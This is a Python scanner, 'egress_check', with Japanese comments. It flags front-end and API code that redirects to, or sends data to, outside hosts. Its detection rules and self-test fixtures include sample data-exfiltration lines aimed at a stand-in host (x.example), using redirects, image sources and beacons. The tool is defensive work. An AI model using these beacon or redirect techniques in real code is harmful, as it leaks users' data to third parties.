#!/usr/bin/env python3
"""egress_check — 自前のコード（画面と API）の、外へ移る処理と外へ送る処理を落とす。

使い方: egress_check.py <置き場...>   /   egress_check.py --selftest
見るもの: 画面の .js・.ts・.jsx・.tsx・.vue・.svelte・.html と、API の .py。部品（node_modules）と作った束（dist）は見ない（部品は deps-diff）。
出力: FAIL <file>:<行> [<型>] <行の頭>、最後に RESULT: PASS|FAIL egress-check (file N、FAIL N)。1 件でも FAIL なら終了コード 1。
"""
import pathlib
import re
import shutil
import sys
import tempfile

WEB = {".js", ".ts", ".jsx", ".tsx", ".mjs", ".cjs", ".vue", ".svelte", ".html"}
SKIP = {"node_modules", "dist", "build", ".git", "__pycache__"}
OUTSIDE = r"""["'`](?:https?:)?//"""
RULES = [
    ("WEB", "画面の移動", re.compile(r"\b(?:window\.|document\.|top\.|self\.|parent\.)?location(?:\.href)?\s*=(?!=)|\blocation\.(?:assign|replace)\s*\(")),
    ("WEB", "新しい窓", re.compile(r"\bwindow\.open\s*\(")),
    ("WEB", "ビーコン", re.compile(r"\bsendBeacon\s*\(")),
    ("WEB", "外の宛先への送り", re.compile(rf"\b(?:fetch|EventSource|WebSocket)\s*\(\s*{OUTSIDE}|\.open\s*\(\s*[\"'][A-Z]+[\"']\s*,\s*{OUTSIDE}")),
    ("WEB", "外の宛先の読み込みと送り", re.compile(rf"\.(?:src|action|href)\s*=\s*{OUTSIDE}|\b(?:src|action)\s*=\s*{OUTSIDE}")),
    ("WEB", "組み立てた宛先への移動", re.compile(r"\.(?:src|action)\s*=\s*`[^`]*\$\{")),
    ("PY", "外への接続", re.compile(r"^\s*(?:import|from)\s+(?:urllib\.request|urllib3|requests|httpx|http\.client|aiohttp|smtplib|ftplib)\b"
                                  r"|\bsocket\.create_connection\s*\(|\.connect\s*\(\s*\(")),
]


def scan(paths):
    fails, files = [], 0
    for root in paths:
        base = pathlib.Path(root)
        items = [base] if base.is_file() else sorted(p for p in base.rglob("*") if p.is_file()) if base.exists() else []
        for p in items:
            if SKIP & set(p.parts):
                continue
            kind = "WEB" if p.suffix in WEB else "PY" if p.suffix == ".py" else None
            if kind is None or p.name.startswith("test_"):
                continue
            files += 1
            for n, line in enumerate(p.read_text(encoding="utf-8", errors="replace").splitlines(), 1):
                for k, name, pat in RULES:
                    if k == kind and pat.search(line):
                        fails.append(f"FAIL {p}:{n} [{name}] {line.strip()[:80]}")
                        break
    return fails, files


def main(argv):
    if argv[:1] == ["--selftest"]:
        return selftest()
    if not argv:
        print(__doc__)
        return 2
    fails, files = scan(argv)
    for f in fails:
        print(f)
    print(f"RESULT: {'PASS' if not fails else 'FAIL'} egress-check (file {files}、FAIL {len(fails)})")
    return 0 if not fails else 1


def selftest():
    cases = [
        ("同じ源の API を読む", "a.ts", "const r = await fetch('/api/v1/orders');\n", 0),
        ("画面の移動で外へ運ぶ", "a.ts", "location.href = 'https://x.example/?q=' + rows;\n", 1),
        ("assign で外へ運ぶ", "a.js", "window.location.assign(u);\n", 1),
        ("比べるだけ", "a.js", "if (location.href == base) {}\n", 0),
        ("外の宛先へ fetch", "a.ts", "fetch(`https://x.example/${id}`);\n", 1),
        ("ビーコン", "a.ts", "navigator.sendBeacon(u, body);\n", 1),
        ("画像の src で外へ送る", "a.ts", "img.src = 'https://x.example/p.gif?d=' + d;\n", 1),
        ("組み立てた src", "a.ts", "img.src = `${host}/p?d=${d}`;\n", 1),
        ("新しい窓", "a.vue", "window.open(u);\n", 1),
        ("API が外へ接続する", "orders_api.py", "import urllib.request\n", 1),
        ("API の json", "orders_api.py", "import json\nimport urllib.parse\n", 0),
        ("API が外へ socket でつなぐ", "orders_api.py", "s = socket.create_connection((h, 443))\n", 1),
        ("部品の中は見ない", "node_modules/x/a.js", "location.href = u;\n", 0),
    ]
    tmp = pathlib.Path(tempfile.mkdtemp(prefix="egress-"))
    bad = 0
    try:
        for name, rel, text, want in cases:
            d = tmp / name.replace(" ", "_")
            f = d / rel
            f.parent.mkdir(parents=True, exist_ok=True)
            f.write_text(text, encoding="utf-8")
            got, _ = scan([str(d)])
            ok = len(got) == want
            bad += 0 if ok else 1
            print(f"{'PASS' if ok else 'FAIL'} egress-check {name}（期待 {want} 件、実際 {len(got)} 件）")
    finally:
        shutil.rmtree(tmp, ignore_errors=True)
    print(f"RESULT: {'PASS' if bad == 0 else 'FAIL'} egress-check --selftest ({len(cases)} 例)")
    return 0 if bad == 0 else 1


if __name__ == "__main__":
    sys.exit(main(sys.argv[1:]))
